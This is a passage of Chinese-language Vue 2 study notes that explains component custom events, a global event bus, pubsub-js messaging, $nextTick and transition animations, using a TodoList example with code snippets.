      // 由于todos是Header组件和Footer组件都在使用，所以放在App中（状态提升）
      todos: JSON.parse(localStorage.getItem('todos')) || []
    };
```

```javascript
  watch: {
    todos: {
      deep: true,
      handler(newValue){
        localStorage.setItem('todos', JSON.stringify(newValue))
      }
    }
  }
```

关于data中为什么要写或空数组：

​	因为当我们将todos里面的数据清空的时候，存储在localStorage中的数据也会为空，	这样子`JSON.Stringify()`方法解析出来的结果也为null，我们在Footer组件中会读取

```javascript
    total(){
      return this.todos.length
    },
```

​		读取数组长度，null.length是没有结果的，所以它会报错，所以当todos里面没有东西的时候，我们得使用空数组来填补，空数组的长度为0，可以读出length属性

关于为什么监视的todos需要完整写法？

​	我们如果不写完整的写法的话，watch只会做浅层次的监视，无法读取到todo里面的isDone，这样在我们勾选某一项todo时，刷新页面后就会默认false展现在页面中，这样不符合我们的需求，所以我们得深度监视。

​	调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230328162258381.png" alt="image-20230328162258381" style="zoom:50%;" />

## 3.9 组件自定义事件

### 3.9.1 绑定

​	当我们需要在子组件向父组件传递数据的时候，可以使用前面说过的：**传递函数类型的props**

​	第二种方法就是绑定自定义事件

App.vue

​	这里App.vue给Student.vue的vc身上绑定了一个自定义事件：atguigu，当atguigu事件触发的时候，将会调用函数：`getStudentName`

```vue
<template>
  <div class="app">
    <h1>{{msg}}</h1>
    <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
    <School :getSchoolName="getSchoolName"/>
    <hr/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法：使用@或v-on） -->
    <Student @atguigu="getStudentName"/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法：使用ref 比直接在标签写更灵活） -->
    <!-- <Student ref="student"/> -->
  </div>
</template>

<script>
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components: {
        Student,
        School
    },
    data() {
      return {
        msg: '你好啊'
      }
    },
    methods: {
      getSchoolName(name){
        console.log('App收到了学校名：', name);
      },
      // 接收多个参数，1、可以用ES6的新语法，将其他的参数自动包装成一个params数组 2、对个参数包装成对象
      getStudentName(name, ...args){
        console.log('App收到了学生名：', name, args)
      }
    },
    mounted() {
      // Student的组件实例对象中的操作
      // this.$refs.student.$on('atguigu', this.getStudentName) //绑定自定义事件
      // this.$refs.student.$once('atguigu', this.getStudentName) //绑定自定义事件（一次性）
    },
}
</script>

<style scoped>
  .app {
    background-color: gray;
    padding: 5px;
  }
</style>
```

这里的School.vue演示的是我们前面学过的传函数类型的props：

```vue
<template>
  <div class="school">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
    <button @click="sendSchoolName">点我给App传学校名</button>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            name: 'x大学芜湖芜湖',
            address: 'HuBei'
        }
    },
    props: ['getSchoolName'],
    methods: {
      sendSchoolName(){
        this.getSchoolName(this.name)
      }
    },
}
</script>

<style scoped>
.school {
  background-color: skyblue;
  padding: 5px;
}
</style>
```

Student.vue里面提到了一个新的方法：`$emit()`

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">点我给App传学生名</button>
  </div>
</template>

<script>

export default {
    name: 'Student',
    data() {
        return {
            name: '张三',
            sex: '男',
        }
    },
    methods: {
      sendStudentName(){
        // 触发Student组件实例身上的atguigu事件
        this.$emit('atguigu', this.name, 666, 888, 999)
      }
    },
}
</script>

<style lang="less" scoped>
.student {
  background-color: orange;
  padding: 5px;
  margin-top: 30px;
}
</style>
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230328172146859.png" alt="image-20230328172146859" style="zoom:50%;" />

### 3.9.2 解绑

​	我们既然绑定了自定义事件，就可以涉及到解绑

​	通过`this.$destroy()` 可以销毁一个组件实例，当组件实例被销毁时，当前组件所有的自定义事件全部不奏效。

App.vue

```vue
    <Student @atguigu="getStudentName" @demo="m1"/>
```

```javascript
      m1(){
        console.log('demo事件被触发了');
      }
```

Student.vue

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="add">点我number++</button>
    <button @click="sendStudentName">点我给App传学生名</button>
    <button @click="unBind">点我解绑atguigu事件</button>
    <button @click="death">销毁当前Student组件的实例（vc）</button>
  </div>
</template>
```

```javascript
    methods: {
      add(){
        console.log('add回调被调用了');
        this.number++
      },
      sendStudentName(){
        // 触发Student组件实例身上的atguigu事件
        this.$emit('atguigu', this.name, 666, 888, 999)
        this.$emit('demo')
      },
      unBind(){
        // this.$off('atguigu') //解绑一个自定义事件
        // this.$off(['atguigu', 'demo']) //解绑多个自定义事件
        this.$off() //解绑所有的自定义事件
      },
      death(){
        this.$destroy() //销毁了当前Student组件实例，销毁后所有Student实例的自定义事件全部不奏效了
      }
    },
```

​	这里我们新学了解绑的API:`vc.$off()`它可以解绑一个和多个（传数组）自定义事件，也可以不传参数来解绑所有自定义事件

​	当我们摧毁组件的时候，其身上的自定义事件也会失效

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230328175259595.png" alt="image-20230328175259595" style="zoom:50%;" />

​	点按后面的按钮再去按前面的按钮将会失效。

### 3.9.3 总结组件的自定义事件

 1. 一种组件间通信的方式，适用于：**子组件 ===> 父组件**

 2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（**事件的回调在A中**）

 3. 绑定自定义事件：

    * 第一种方式： 父组件中：`<Demo @atguigu="test"/>`或`<Demo v-on:atguigu="test"/>`

    * 第二种方式，在父组件中：

      ```vue
      <Demo ref="demo"/>
      ......
      mounted(){
      	this.$refs.$on('atguigu', this.test)
      }
      ```

    * 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法

 4. 触发自定义事件：`this.$emit('atguigu', 数据)`

 5. 解绑自定义事件：`this.$off('atguigu')`

 6. 组件上也可以绑定原生DOM事件,需要使用`native`修饰符

 7. 注意：通过`this.$refs.xxx.$on('atguigu', 回调)`绑定自定义事件时，回调**要么配置在methods中，要么用箭头函数**，否则this指向会出问题！

```vue
<Student @atguigu="getStudentName" @demo="m1" @click.native="show"/>
```

```javascript
      show(){
        alert(123)
      }
```

​	这里的 native就是让vue知道这个是内置事件

全部代码：

App.vue

```vue
<template>
  <div class="app">
    <h1>{{msg}}，{{studentName}}</h1>
    <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
    <School :getSchoolName="getSchoolName"/>
    <hr/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法：使用@或v-on） -->
    <Student @atguigu="getStudentName" @demo="m1" @click.native="show"/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法：使用ref 比直接在标签写更灵活） -->
    <!-- <Student ref="student"/> -->
  </div>
</template>

<script>
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components: {
        Student,
        School
    },
    data() {
      return {
        msg: '你好啊',
        studentName: ''

      }
    },
    methods: {
      getSchoolName(name){
        console.log('App收到了学校名：', name);
      },
      // 接收多个参数，1、可以用ES6的新语法，将其他的参数自动包装成一个params数组 2、对个参数包装成对象
      getStudentName(name, ...args){
        console.log('App收到了学生名：', name, args)
        this.studentName = name
      },
      m1(){
        console.log('demo事件被触发了');
      },
      show(){
        alert(123)
      }
    },
    mounted() {
      // Student的组件实例对象中的操作
      // this.$refs.student.$on('atguigu', this.getStudentName) //绑定自定义事件
      // this.$refs.student.$once('atguigu', this.getStudentName) //绑定自定义事件（一次性）
      // this.$refs.student.$on('atguigu', () => {
      //   console.log('App收到了学生名：', name, args)
      //   this.studentName = name
      // })
    },
}
</script>

<style scoped>
  .app {
    background-color: gray;
    padding: 5px;
  }
</style>
```

School.vue

```vue
<template>
  <div class="school">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
    <button @click="sendSchoolName">点我给App传学校名</button>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            name: 'x大学芜湖芜湖',
            address: 'HuBei'
        }
    },
    props: ['getSchoolName'],
    methods: {
      sendSchoolName(){
        this.getSchoolName(this.name)
      }
    },
}
</script>

<style scoped>
.school {
  background-color: skyblue;
  padding: 5px;
}
</style>
```

Student.vue

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="add">点我number++</button>
    <button @click="sendStudentName">点我给App传学生名</button>
    <button @click="unBind">点我解绑atguigu事件</button>
    <button @click="death">销毁当前Student组件的实例（vc）</button>
  </div>
</template>

<script>

export default {
    name: 'Student',
    data() {
        return {
            name: '张三',
            sex: '男',
            number: 0
        }
    },
    methods: {
      add(){
        console.log('add回调被调用了');
        this.number++
      },
      sendStudentName(){
        // 触发Student组件实例身上的atguigu事件
        this.$emit('atguigu', this.name, 666, 888, 999)
        // this.$emit('demo')
        // this.$emit('click')
      },
      unBind(){
        this.$off('atguigu') //解绑一个自定义事件
        // this.$off(['atguigu', 'demo']) //解绑多个自定义事件
        this.$off() //解绑所有的自定义事件
      },
      death(){
        this.$destroy() //销毁了当前Student组件实例，销毁后所有Student实例的自定义事件全部不奏效了
      }
    },
}
</script>

<style lang="less" scoped>
.student {
  background-color: orange;
  padding: 5px;
  margin-top: 30px;
}
</style>
```

### 3.9.4 TodoList案例 组件自定义事件

​	既然提到了子传父，我们可以用自定义事件来替代传props来实现我们的需求

App.vue

```vue
<Header @addTodo="addTodo" />
<Footer :todos="todos" @checkAllTodo="checkAllTodo" @clearAllDoneTodo="clearAllDoneTodo" />
```

涉及到直接子传父的组件有：Header、Footer

Header.vue

```javascript
  methods: {
    addData(){
      // 校验数据
      if(!this.title.trim()) return alert('输入不能为空！')
      // 将用户的输入包装成一个todo对象
      const todoObj = {id: nanoid(), title: this.title, isDone: false}
      // 通知App组件去添加一个todo对象
      this.$emit('addTodo', todoObj) //直接使用$emit方法触发
      // 清空输入
      this.title = ''
    }
  },
```

Footer.vue

```javascript
    isAll: {
      get(){
        return this.doneTotal === this.total && this.total > 0
      },
      set(value){
        this.$emit('checkAllTodo', value)
      }
    }
```

```javascript
    clearAll(){
      if (confirm('确定删除所有已完成的任务吗？')) {
        this.$emit('clearAllDoneTodo')
      }
    }
```

​	之前涉及到调用回调函数的地方我们都可以使用`$emit()`方法来触发自定义事件

## 3.10 全局事件总线

​	全局事件总线是一种组件间通信的方式，适用于**任意组件间通信**

​	我们在做TodoList案例的时候总会发现我们很难在兄弟组件之间传递数据，我们想要实现任意组件间的通信，就需要借助到全局事件总线。

​	假设我们独立于App组件之外有一个中转站名为X，每一个组件需要在X这个中转站绑定一个**自定义事件**，回调函数留在我们当初绑定事件的那个组件中，当我们以后有需要组件间传递数据的时候，就需要传递数据的组件调用在X中转站的某个事件，数据将会从回调函数跑到我们当初绑定事件的那个函数中，这就达到了两个组件间的通信目的

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230329201259670.png" alt="image-20230329201259670" style="zoom:50%;" />

​	这个中转站X需要做到两点：

	1. 所有组件包括App都能够随时看到它
	1. 它里面可以使用自定义事件的相关API（`$on()`、`$off()`、`$emit()`）

**现在我们着手实现第一个要求：**

​	前面在解释 Vue实例与组件实例的内置关系的时候提到：Vue构造函数缔造了**vm**，VueComponent构造函数缔造了**vc**，所以构造函数（Vue构造函数、VueComponent构造函数）的显式原型和实例对象（vm、vc）的隐式原型都会指向同一组

​	所以就有这个关系：

​	**VueComponent.prototype.__proto__ === Vue.prototype**

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320172546242.png" alt="image-20230320172546242" style="zoom:50%;" />

​	所以我们可以把中转站X放到Vue原型对象上，这样子所有的组件都可以读取到。

main.js

```javascript
// 引入Vue
import Vue from 'vue';
// 引入App
import App from './App'
// 关闭Vue的生产提示
Vue.config.productionTip = false

Vue.prototype.x = {a: 1, b: 2}

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
})
```

App.vue

```vue
<template>
  <div class="app">
    <h1>{{msg}}</h1>
    <School/>
    <Student/>
  </div>
</template>

<script>
import Student from './components/Student.vue'
import School from './components/School.vue'

export default {
    name: 'App',
    components: {
        Student,
        School
    },
    data() {
      return {
        msg: '你好啊',
      }
    },
}
</script>

<style scoped>
  .app {
    background-color: gray;
    padding: 5px;
  }
</style>
```

School.vue

```vue
<template>
  <div class="school">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            name: 'x大学芜湖芜湖',
            address: 'HuBei'
        }
    },
    mounted() {
      console.log('School', this.x);
    },
}
</script>

<style scoped>
.school {
  background-color: skyblue;
  padding: 5px;
}
</style>
```

Student.vue

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
  </div>
</template>

<script>

export default {
    name: 'Student',
    data() {
        return {
            name: '张三',
            sex: '男',
        }
    },
    mounted() {
      console.log('Student', this.x);
    },
}
</script>

<style lang="less" scoped>
.student {
  background-color: orange;
  padding: 5px;
  margin-top: 30px;
}
</style>
```

在main.js中，在Vue实例对象上放入了一个对象x，这样全部组件都可以读取到

![image-20230329210020511](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230329210020511.png)

**现在我们着手实现第二个要求：**

​	之所以我们在之前的自定义事件里能够使用`$on()`等API，是因为它们位于组件实例对象中

​	vm的缔造者Vue身上就有相关的`$on()`和`$off()`方法，所以我们可以选择将中转站放在vm的原型对象上！

安装全局事件总线：

main.js

​	这个中转站有一个官方的名字：总线($bus)

```js
// 引入Vue
import Vue from 'vue';
// 引入App
import App from './App'
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 在vc身上追加一个能使用$on()的组件实例对象
// const Demo = Vue.extend({})
// const d = new Demo()
// Vue.prototype.x = d

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
    beforeCreate() {
        Vue.prototype.$bus = this //安装全局事件总线
    },
    mounted() {
        console.log(this);
    },
})
```

​	使用事件总线：

	1. 接收数据：这里是我们的School组件想接收数据，则School组件中给$bus绑定自定义事件hello，**事件的回调留在School组件自身**

School.vue

```javascript
    mounted() {
      // console.log('School', this.x);
      this.$bus.$on('hello', (data) => {
        console.log('我是School组件，收到了数据', data);
      })
    },
    // 销毁组件之前解绑对应自定义事件，如果我们off里面什么都不写，就代表销毁所有事件，就会代表所有给中转站绑定的时间全部失效
    beforeDestroy() {
      this.$bus.$off('hello')
    },
```

最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件

2. 提供数据 这里由兄弟组件Student提供数据 `this.$bus.$emit('xxx',数据)`

​	Student.vue

```vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>
```

```javascript
export default {
    name: 'Student',
    data() {
        return {
            name: '张三',
            sex: '男',
        }
    },
    mounted() {
      // console.log('Student', this.x);
    },
    methods: {
      sendStudentName(){
        this.$bus.$emit('hello', this.name)
      }
    },
}
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230329214237812.png" alt="image-20230329214237812" style="zoom:50%;" />

调试结果：

![image-20230329215224886](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230329215224886.png)

![image-20230329215254709](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230329215254709.png)

**用全局事件总线完善TodoList案例：**

​	我们学习了全局事件总线之后，可以实现在任意两个组件之间传递数据，所以我们可以着手来完善TodoList案例中的组件传递数据部分

​	父子组件之间传递数据和子父组件传递数据我们都可以使用props的方法传递，所以可以不用修改

​	爷孙组件传递数据我们还是使用的是逐层传递，这是没必要的操作，所以当孙组件Item传数据给爷组件App的时候我们可以用全局事件总线来实现，从而不用走List这个组件

main.js

```javascript
    // 安装全局事件总线
    beforeCreate() {
        Vue.prototype.$bus = this
    },
```

既然不用props，则可以把那些传在List的回调全部删除，相应的在List、Item里面接收的props也可以删除

App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 通过props传给子组件一个函数 -->
        <Header :addTodo="addTodo" />
        <List :todos="todos" />
        <Footer :todos="todos" :checkAllTodo="checkAllTodo" :clearAllDoneTodo="clearAllDoneTodo" />
      </div>
    </div>
  </div>
</template>
```

```javascript
  mounted() {
    // 绑定自定义事件，回调留在本组件中
    this.$bus.$on('changeIsDone', this.changeIsDone)
    this.$bus.$on('deleteTodo', this.deleteTodo)
  },
  beforeDestroy() {
    // 销毁组件之前解绑自定义事件
    this.$bus.$off('changeIsDone')
    this.$bus.$off('deleteTodo')
  },
```

List.vue

```vue
<template>
  <ul class="todo-main">
    <Item
      v-for="todoObj in todos"
      :key="todoObj.id"
      :todo="todoObj"
    />
  </ul>
</template>
```

```javascript
  props: ["todos"],
```

Item.vue

```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input
          type="checkbox"
          :checked="this.todo.isDone"
          @change="handleCheck(todo.id)"
        />
        <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
        <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
        <span>{{ this.todo.title }}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    </li>
  </ul>
</template>
```

```javascript
  props: {
    // 声明接收todo对象
    todo: {
      type: Object,
      required: true,
    },
  },
  methods: {
    // 勾选or取消勾选
    handleCheck(id) {
      // 通知App组件将对应的todo对象的idDone值取反
      // this.changeIsDone(id)
      this.$bus.$emit('changeIsDone', id)
    },
    // 删除
    handleDelete(id){
      if (confirm('确定删除吗？')) {
        // 通知App删除对应id的todo项
        // this.deleteTodo(id)
        this.$bus.$emit('deleteTodo', id)
      }
    }
  },
```

​	这样子就实现了任意两个组件之间的直接通信，不用逐层传递。

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230330164754990.png" alt="image-20230330164754990" style="zoom:50%;" />

## 3.11 消息订阅与发布（pubsub）

​	这也是一种组件间通信的方式，适用于**任意组件间通信**（适用各类前端框架，Vue使用较少）

​	使用步骤：

1. 安装第三方库pubsub:`npm i pubsub-js`
2. 在需要用的地方引入：`import pubsub from 'pubsub-js'`
3. 接收数据：A组件想要接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

```javascript
methods:{
	demo(data){...}
}
......
mounted(){
	this.pid = pubsub.subscribe('xxx',this.demo) 	// 订阅消息，会创建一个id
}
......
beforeDestroy(){
	pubsub.unsubscribe(this.pid)
}

```

4. 提供数据：`pubsub.publish('xxx', 数据)`
5. 最好在beforeDestory钩子中，用`pubsub.unsubcrive(pid)`去取消订阅

我们仍然使用School组件和Student通信来验证这个问题：

School需要Student传来的数据，所以School是订阅消息，Student是发布消息

School.vue

```javascript
    mounted() {
      // console.log('School', this.x);
      // this.$bus.$on('hello', (data) => {
      //   console.log('我是School组件，收到了数据', data);
      // })
      this.pubId = pubsub.subscribe('hello', (msgName, data) => {
        console.log('有人发布了hello消息，hello消息的回调执行了', msgName, data);
        console.log(this);
      })
    },
    // 销毁组件之前解绑对应自定义事件，如果我们off里面什么都不写，就代表销毁所有事件，就会代表所有给中转站绑定的时间全部失效
    beforeDestroy() {
      // this.$bus.$off('hello')
      pubsub.unsubscribe(this.pubId)
    },
```

Student.vue

```javascript
    methods: {
      sendStudentName(){
        // this.$bus.$emit('hello', this.name)
        pubsub.publish('hello', this.name)
      }
    },
```

​	需要注意的是，我们订阅消息的回调需要写成箭头函数，如果我们写成普通函数的话，这里的this的值将会是`undefined`，是因为我们这是在第三方库里面使用this，vue不会保证在第三方库里面的this指向是vm或vc，所以最好的解决办法就是写成箭头函数，箭头函数没有自己的this，它会往外找，自然会找到vc。

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230330174838187.png" alt="image-20230330174838187" style="zoom:50%;" />

**TodoList案例使用pubsub写法：**

​	我们这里将Item组件的删除功能使用pubsub写法来实现：

​	这里需要App接收到删除Item的id，所以App是订阅，Item是发布

App.vue

method中负责删除的实现：

```javascript
    // 删除一个todo
    deleteTodo(_, id){
      this.todos = this.todos.filter((todo) => {
        return todo.id !== id
      })
    },
```

```javascript
  mounted() {
    // 绑定自定义事件，回调留在本组件中
    // 全局事件总线写法
    this.$bus.$on('changeIsDone', this.changeIsDone)
    // 消息订阅与发布写法
    this.pubId = pubsub.subscribe('deleteTodo', this.deleteTodo)
  },
  beforeDestroy() {
    // 销毁组件之前解绑自定义事件
    this.$bus.$off('changeIsDone')
    // 消息订阅与发布写法
    pubsub.unsubscribe(pubId)
  },
};
```

Item.vue

```javascript
    // 删除
    handleDelete(id){
      if (confirm('确定删除吗？')) {
        // 通知App删除对应id的todo项
        // this.deleteTodo(id)
        // this.$bus.$emit('deleteTodo', id)
        pubsub.publish('deleteTodo', id)
      } 
    }
  },
```

​	由于pubsub-js的API设计需要传入消息名字作为第一个参数，而我们业务需求只需要传递id这个数据就可以了，所以我们选择在deleteTodo方法里面传一个占位符来充当第一个参数

## 3.12 完善TodoList案例：追加编辑按钮

​	我们的需求是在每一个Todo项的删除按钮旁边加一个编辑按钮，用来修改todo项的title属性

​	用全局事件总线实现，我们可以定义一个`updateTodo`事件来更新数据

​	首先我们需要在Item组件里实现点按编辑的时候，出来一个带有todo.title属性的input框并获取焦点，在我们失去焦点的时候将input框的值赋给todo.title

​	所以标识这个todo是否在编辑状态就显得很重要，我们重新给todo追加了一个变量：`isEdit`

Header.vue

```javascript
  methods: {
    addData(){
      // 校验数据
      if(!this.title.trim()) return alert('输入不能为空！')
      // 将用户的输入包装成一个todo对象
      const todoObj = {id: nanoid(), title: this.title, isDone: false, isEdit: false}
      // 通知App组件去添加一个todo对象
      this.addTodo(todoObj)
      // 清空输入
      this.title = ''
    }
  },
```



Item.vue

​	在Item组件里我们得写相关实现 需要在我们点按编辑按钮以及完成输入的时候修改`isEdit`的值以及完成修改的时候失去焦点



```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input
          type="checkbox"
          :checked="this.todo.isDone"
          @change="handleCheck(todo.id)"
        />
        <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
        <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
        <span v-show="!todo.isEdit">{{ this.todo.title }}</span>
        <input
          type="text"
          v-show="todo.isEdit"
          :value="todo.title"
          @blur="handleBlur(todo, $event)"
          ref="inputTitle"
        />
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">
        删除
      </button>
      <button
        class="btn btn-edit"
        v-show="!todo.isEdit"
        @click="handleEdit(todo)"
      >
        编辑
      </button>
    </li>
  </ul>
</template>
```

​	在我们编辑的时候，Vue会在回调函数执行完之后在修改页面，这也就代表我们写的获取焦点的代码会在input框生成在页面之前就会执行，无法实现功能，所以我们必须使用到这个API:`$nextTick`

```javascript
    // 编辑
    handleEdit(todo) {
      todo.isEdit = true;
      // nextTick所指定的回调函数会在DOM节点更新完毕之后再执行
      this.$nextTick(function () {
        this.$refs.inputTitle.focus();
      });
      // 这样不指定延迟时间也可以实现立即获取焦点，上面是官方的写法
      // setTimeout(() => {
      //   this.$refs.inputTitle.focus()
      // })
    },
```

​	失去焦点就代表我们可以将title值进行修改，这里我们需要拿到我们修改后的值，所以需要拿到我们的事件对象

```vue
@blur="handleBlur(todo, $event)"
```

```javascript
    // 失去焦点回调（真正执行修改逻辑）
    handleBlur(todo, e) {
      todo.isEdit = false;
      console.log(e);
      if (!e.target.value.trim()) return alert("输入不能为空！");
      this.$bus.$emit("updateTodo", todo.id, e.target.value);
    },
```

App.vue

​	App中就可以写关于更新的事件回调了

```javascript
    // 更新一个Todo
    updateTodo(id, title){
      this.todos.forEach((todo) => {
        if (todo.id === id) {
          todo.title = title
        }
      })
    }
```

绑定事件以及销毁：

```javascript
  mounted() {
    // 绑定自定义事件，回调留在本组件中
    // 全局事件总线写法
    this.$bus.$on('changeIsDone', this.changeIsDone)
    // 消息订阅与发布写法
    this.pubId = pubsub.subscribe('deleteTodo', this.deleteTodo)
    // 更新title的回调
    this.$bus.$on('updateTodo', this.updateTodo)
  },
  beforeDestroy() {
    // 销毁组件之前解绑自定义事件
    this.$bus.$off('changeIsDone')
    this.$bus.$off('updateTodo')
    // 消息订阅与发布写法
    pubsub.unsubscribe(pubId)
  },
```

调试结果：![image-20230330200638858](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230330200638858.png)

## 3.13 过渡与动画效果

### 3.13.1 动画效果

​	我们在组件中写入一个动画，如果在动画的标签外围包裹一个`<transition>`标签的话，vue可以帮我们在核实的时候给元素添加样式类名

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition name="transform" :appear="true">
      <h1 v-show="isShow">你好啊</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Test",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: orange;
}
.transform-enter-active {
  animation: hello 0.5s linear;
}

.transform-leave-active {
  animation: hello 0.5s linear reverse;
}
@keyframes hello {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
</style>

```

​		在外围报裹了transition标签，我们在这里只需要修改isShow的值就能够控制动画的类名修改，非常方便，而且vue编译完之后会给我们脱掉transition标签

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230330204827876.png" alt="image-20230330204827876" style="zoom:50%;" />

### 3.13.2 过渡效果

​	这一节我们使用过渡效果来写上面的动画案例：

​	在这里我们就可以不用使用关键帧了，直接使用Vue给我们提供的4个类名：`.name-enter`、`.name-enter-to`、`.name-leave`、`.name-leave-to`

​	动画转换的方式以及参数我们用`.name-enter/leave-active`写

```vue
<style scoped>
h1 {
  background-color: orange;
}

/* 进入的起点、离开的终点 */
.transform-enter, .transform-leave-to  {
  transform: translateX(-100%);
}

/* 转换的方式 */
.transform-enter-active, .transform-leave-active {
  transition: 0.5s;
}

/* 进入的终点、离开的起点  */
.transform-enter-to, .transform-leave {
  transform: translateX(0);
}

</style>
```

​	就会发现和上个组件一样的效果

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331161923649.png" alt="image-20230331161923649" style="zoom:50%;" />

​	个人认为过渡效果做出来的动画，在多次转换的时候更平滑

### 3.13.3 多个元素过渡

​	我们如果要在transition标签里面放入多个元素，则可以将transition变为transition-group

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group name="transform" :appear="true">
      <h1 v-show="isShow" key="1">你好啊</h1>
      <h1 v-show="!isShow" key="2">睡大觉</h1>
    </transition-group>
  </div>
</template>
```

![image-20230331162747168](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331162747168.png)

### 3.13.4 集成第三方动画

​	Vue也可以让我们使用第三方的库来实现完美的动画效果

​	这里在npm官网引入的是animate.css

```shell
npm install animate.css
```

引入样式库

```javascript
import 'animate.css';
```

然后将transition里面的name配置项改为`animate__animated animate__bounce`，我们将会使用两个新配置项：`enter-active-class`、`leave-active-class`，分别对应元素的进入和离开，然后我们就可以在网站复制效果名作为它们的值了

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group
      :appear="true"
      name="animate__animated animate__bounce"
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp"
    >
      <h1 v-show="isShow" key="1">你好啊</h1>
      <h1 v-show="!isShow" key="2">睡大觉</h1>
    </transition-group>
  </div>
</template>
```

​	style标签只用写简单的样式就行了，animate.css都能帮我们实现

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331164445783.png" alt="image-20230331164445783" style="zoom:50%;" />

### 3.13.5 总结Vue封装的过渡与动画

 1. 作用：在插入、更新或移除DOM元素时，在合适的时候给元素添加样式类名

 2. 图示：![image-20230331164813825](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331164813825.png)

 3. 写法：

    1. 准备好样式：

       * 元素进入的样式：
         1. v-enter：进入的起点
         2. v-enter-active：进入过程中
         3. v-enter-to：进入的终点
       * 元素离开的样式：
         1. v-leave：离开的起点
         2. v-leave-active：离开过程中
         3. v-leave-to：离开的终点

    2. 使用`<transition>`包裹要过渡的元素，并配置name属性：

       ```vue
       <transition name="hello">
       	<h1 v-show="isShow">你好啊/h1>
       </transition>
       ```

    3. 备注：若有多个元素需要过渡，则需要使用：`<transision-group>`，且每个元素都要指定`key`值

    **完善TodoList案例：给Item添加动画**

    ​	我们来着手给每一个Item添加Animate.css中的动画：

    ```vue
    <template>
      <transition
        name="animate__animated animate__bounce"
        enter-active-class="animate__rotateInDownLeft"
        leave-active-class="animate__rotateOutUpRight"
        :appear="true"
      >
        <ul class="todo-main">
          <li>
            <label>
              <input
                type="checkbox"
                :checked="this.todo.isDone"
                @change="handleCheck(todo.id)"
              />
              <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
              <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
              <span v-show="!todo.isEdit">{{ this.todo.title }}</span>
              <input
                type="text"
                v-show="todo.isEdit"
                :value="todo.title"
                @blur="handleBlur(todo, $event)"
                ref="inputTitle"
              />
            </label>
            <button class="btn btn-danger" @click="handleDelete(todo.id)">
              删除
            </button>
            <button
              class="btn btn-edit"
              v-show="!todo.isEdit"
              @click="handleEdit(todo)"
            >
              编辑
